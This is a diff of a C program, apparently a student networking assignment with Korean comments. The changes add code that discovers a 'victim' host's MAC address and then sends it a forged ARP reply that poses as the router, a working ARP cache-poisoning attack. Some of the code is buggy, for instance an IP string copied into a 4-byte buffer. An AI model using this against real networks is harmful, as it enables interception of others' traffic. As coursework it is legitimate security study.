@@ -22,10 +22,7 @@ void usage() {
 
 
 int get_mMAC(const char *ifname, u_char* myMAC);
-//int get_mIP(const char *dev, u_char* myIP);
-//void get_smac(pcap_t* handle, uint8_t* mymac, uint8_t* myip, uint8_t* smac,  uint8_t* sip);
-
-
+int get_mIP(const char *dev, u_char* myIP);
 
 
 int main(int argc, char* argv[]) {
@@ -35,14 +32,15 @@ int main(int argc, char* argv[]) {
 	}
 
 	char* dev = argv[1];
-
     u_char myMAC[6]; //호스트 맥
     get_mMAC(dev, myMAC);
+    u_char myIP[4];
+    get_mIP(dev, myIP);
 
+    u_char sMAC[6];
     u_char sender_ip[4]; //argv[2] victim, 핫스팟 킨 노트북
-    u_char target_ip[4]; //argv[3] 라우터 ip... 대체할게있나...
+    u_char target_ip[4]; //argv[3] 라우터 ip... 대체할게없다...
 	char errbuf[PCAP_ERRBUF_SIZE];
-
     inet_aton(argv[2], (in_addr*)sender_ip); // victim
     inet_aton(argv[3], (in_addr*)target_ip); // router
 
@@ -55,20 +53,65 @@ int main(int argc, char* argv[]) {
      //패킷생성 -by 길길
      EthArpPacket packet;
 
-   // get_smac(handle, myMAC, myIP, sMAC, sender_ip);
 
-    packet.eth_.dmac_ = Mac("F8:A2:D6:E0:45:AF"); //목적지 mac 얻는 법???
+   //request 보내기 -> reply 받으면 거기서 mac 꺼낼 수 있음!
+     packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); //브로드캐스팅
+     packet.eth_.smac_ = Mac(myMAC);
+     packet.eth_.type_ = htons(EthHdr::Arp);
+
+     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+     packet.arp_.pro_ = htons(EthHdr::Ip4);
+     packet.arp_.hln_ = Mac::SIZE;
+     packet.arp_.pln_ = Ip::SIZE;
+     packet.arp_.op_ = htons(ArpHdr::Request);
+     packet.arp_.smac_ = Mac(myMAC);
+     packet.arp_.sip_ = htons(Ip(*myIP)); //내 ip
+     packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+     packet.arp_.tip_ = htonl(*sender_ip); //victim htonl(Ip(*sender_ip))
+
+     while(1){
+             struct pcap_pkthdr * rep_header;
+             const u_char * rep_packet;
+
+             printf("ARP request packet 보내는 중...\n");
+             pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+             int res = pcap_next_ex(handle, &rep_header, &rep_packet);
+             if(res ==0) continue;
+             if(res == -1 || res == -2) break;
+
+             EthHdr * get_mac = ( EthHdr *)rep_packet;
+
+             if( get_mac->type_ != htons(EthHdr::Arp)){
+                 continue;
+             }
+             //printf("맥 까지는받음\n");
+
+             ArpHdr * get_arp = ( ArpHdr *)(rep_packet+14);
+             if(get_arp->op_ != htons(ArpHdr::Reply)){ //reply만 진행
+                 continue;
+             }
+             //printf("arp 까지는받음\n");
+
+             memcpy(sMAC, get_arp->smac_, 6);
+             //printf("victim's MAC 받아내기 성공!\n");
+             /*printf("smac : %02x:%02x:%02x:%02x:%02x:%02x\n", sMAC[0],sMAC[1],sMAC[2],sMAC[3],
+                     sMAC[4],sMAC[5]);*/
+             break;
+
+         }
+
+    packet.eth_.dmac_ = Mac(sMAC); //목적지 mac 얻는 법??? -> 이번 과제 핵심
     packet.eth_.smac_ = Mac(myMAC);
-	packet.eth_.type_ = htons(EthHdr::Arp);
-
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
+    packet.eth_.type_ = htons(EthHdr::Arp);
+    
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Reply);
     packet.arp_.smac_ = Mac(myMAC);
     packet.arp_.sip_ = htonl(*target_ip); //htonl(Ip(*target_ip));
-    packet.arp_.tmac_ = Mac("F8:A2:D6:E0:45:AF"); //필요함 Mac(sMAC)
+    packet.arp_.tmac_ = Mac(sMAC); //필요함 Mac(sMAC)
     packet.arp_.tip_ = htonl(*sender_ip); //victim htonl(Ip(*sender_ip))
 
 
@@ -96,4 +139,24 @@ int get_mMAC(const char *dev, u_char* myMAC){
         }
         return 1;
 }
+
+int get_mIP(const char *dev, u_char* myIP)
+{
+    struct ifreq s;
+    int fd =socket(AF_INET,SOCK_STREAM,0);
+    char ipstr[40];//4하니깐 스택에러
+
+    strncpy(s.ifr_name, dev, IFNAMSIZ);
+
+    if (ioctl(fd,SIOCGIFADDR,&s)< 0 )
+    {
+        perror("ip ioctl error");
+        return -1;
+    }
+
+    inet_ntop(AF_INET, s.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
+    memcpy (myIP, ipstr, sizeof(struct sockaddr));
+    return 0;
+}
+
 
